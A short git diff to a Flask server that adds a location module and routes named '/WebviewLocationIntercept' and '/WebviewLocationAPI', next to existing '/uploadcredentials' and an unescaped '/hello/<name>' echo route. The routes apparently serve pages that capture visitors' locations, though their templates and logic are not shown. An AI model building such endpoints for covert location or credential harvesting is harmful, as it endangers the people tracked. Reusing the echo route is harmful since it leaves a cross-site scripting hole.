@@ -5,6 +5,7 @@ try:
     from modules import *
     from bot import *
     from mongoatlas import *
+    from location import *
     from flask_cors import CORS, cross_origin
 except ImportError as e:
     print("\n[INFO] One or more modules are missing.\n")
@@ -234,6 +235,22 @@ def uploadcredentials():
 @app.route('/hello/<name>')
 def hello_name(name):
    return 'Hello %s!' % name
+
+@app.route('/location')
+def location():
+    return render_template('locationindex.html')
+
+@app.route('/WebviewLocationIntercept')
+@cross_origin()
+def Intercept():
+    return render_template('intercept.html')
+
+
+@app.route('/WebviewLocationAPI', methods=['GET', 'POST'])
+@cross_origin()
+def API():
+    return GetLocation(request)
+
 
 @app.route('/uploader', methods=['GET', 'POST'])
 def upload_file():
